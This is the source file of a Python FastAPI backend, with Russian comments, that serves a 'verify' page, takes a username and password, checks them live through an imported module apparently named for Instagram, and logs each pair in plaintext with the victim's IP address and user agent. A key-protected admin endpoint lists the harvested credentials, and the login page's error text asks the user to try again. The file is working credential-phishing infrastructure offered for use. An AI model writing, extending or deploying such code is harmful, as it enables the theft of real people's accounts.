# python, backend/main.py
from fastapi import FastAPI, Request, HTTPException, Depends, Header
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from datetime import datetime
import sqlite3, time, os, sys

# Добавляем папку backend в пути поиска модулей, чтобы Python нашел db.py и ig_check.py
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from db import init
from ig_check import check_password

# Пути к папкам
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
STATIC_DIR = os.path.join(BASE_DIR, "static")
ADMIN_DIR = os.path.join(BASE_DIR, "admin")

app = FastAPI()

if not os.path.exists(STATIC_DIR):
    os.makedirs(STATIC_DIR)

# Подключаем статику
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

# Ключ для входа в админку (СМЕНИ НА СВОЙ!)
ADMIN_KEY = "change_me_123"

# Инициализация базы
conn = init()

class VerifyIn(BaseModel):
    username: str
    password: str

@app.get("/")
def root():
    return FileResponse(os.path.join(STATIC_DIR, "index.html"))

@app.get("/verify.html")
def verify_page():
    return FileResponse(os.path.join(STATIC_DIR, "verify.html"))

@app.get("/success.html")
def success_page():
    return FileResponse(os.path.join(STATIC_DIR, "success.html"))

@app.post("/api/verify")
async def verify(data: VerifyIn, req: Request):
    print(f"\n[API] >>> GOT REQUEST: {data.username}")
    
    valid, reason = check_password(data.username, data.password)
    
    print(f"[API] >>> CHECK RESULT: valid={valid}, reason={reason}")

    ip = req.client.host
    ua = req.headers.get("user-agent", "")[:250]
    
    try:
        conn.execute(
            "INSERT INTO hits(username,password,ip,ua,valid,ts) VALUES(?,?,?,?,?,?)",
            (data.username, data.password, ip, ua, int(valid), int(time.time()))
        )
        conn.commit()
    except Exception as e:
        print(f"[DB] !!! ERROR: {e}")

    if valid:
        return {"ok": True}
    return {"ok": False, "error": "Неверный пароль. Попробуйте снова."}

def check_admin(x_admin_key: str = Header(default="")):
    if x_admin_key != ADMIN_KEY:
        raise HTTPException(status_code=403, detail="forbidden")

@app.get("/admin", response_class=HTMLResponse)
def admin_page():
    return FileResponse(os.path.join(ADMIN_DIR, "index.html"))

@app.get("/api/admin/hits", dependencies=[Depends(check_admin)])
def list_hits(limit: int = 100):
    try:
        rows = conn.execute(
            "SELECT id, username, password, ip, ua, valid, ts FROM hits ORDER BY id DESC LIMIT ?",
            (limit,)
        ).fetchall()
    except Exception as e:
        print(f"[DB] !!! READ ERROR: {e}")
        return []

    out = []
    for r in rows:
        out.append({
            "id": r[0], "username": r[1], "password": r[2], 
            "ip": r[3], "ua": r[4], "valid": bool(r[5]),
            "time": datetime.fromtimestamp(r[6]).strftime("%Y-%m-%d %H:%M:%S")
        })
    return out